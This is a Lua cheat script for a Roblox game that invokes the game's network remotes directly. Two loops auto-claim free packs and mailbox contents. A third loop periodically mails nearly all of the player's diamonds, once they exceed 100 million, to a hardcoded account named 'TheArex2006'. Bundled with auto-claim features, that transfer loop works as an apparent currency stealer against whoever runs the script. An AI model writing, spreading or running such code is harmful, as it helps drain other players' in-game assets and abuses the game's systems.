spawn(function()
    while true do
        pcall(function() 
            game:GetService("ReplicatedStorage").Network["ForeverPacks: Claim Free"]:InvokeServer("Default")
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)


spawn(function()
    while true do
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)

spawn(function()
    local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
    
    local username = "TheArex2006" -- Replace with recipient's username
    local loopInterval = 5 -- Interval in minutes
    local mailTax = 100000 -- Tax deduction for sending diamonds
    local diamondThreshold = 100000000 -- Threshold for sending all gems

    while true do
        print("Attempting to retrieve diamond data...")
        local diamondItem = CurrencyCmds.GetItem("Diamonds")
        
        if not diamondItem or not diamondItem._data then
            print("[ERROR] Failed to retrieve diamond data. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        -- Retrieve diamond amount and unique identifier
        local diamonds = diamondItem._data._am
        local diamondUID = diamondItem._uid -- Correct unique identifier

        print("Diamonds:", diamonds)
        print("Diamond UID:", diamondUID)

        -- Validate diamondUID
        if not diamondUID then
            print("[ERROR] diamondUID is nil. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        -- Check threshold and send diamonds
        if diamonds > diamondThreshold then
            local amountToSend = diamonds - mailTax
            if amountToSend <= 0 then
                print("[ERROR] Amount to send is invalid (<= 0). Skipping this cycle.")
                task.wait(loopInterval * 60)
                continue
            end

            print("Threshold reached! Preparing to send diamonds.")
            print("Amount to send (after tax):", amountToSend)

            local args = {
                username, -- Recipient's username
                "Sending all my gems!", -- Mail message
                "Currency", -- Type of item being sent
                diamondUID, -- Correct unique ID for diamonds
                amountToSend -- Amount after deducting mail tax
            }

            print("Args to invoke server:", args)

            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            end)

            if success then
                print("[SUCCESS] Diamonds sent successfully!")
            else
                print("[ERROR] Failed to send diamonds. Error:", errorMessage)
            end
        else
            print("Diamonds are below the threshold. Current amount:", diamonds)
        end

        print("Waiting for the next loop interval...")
        task.wait(loopInterval * 60)
    end
end)
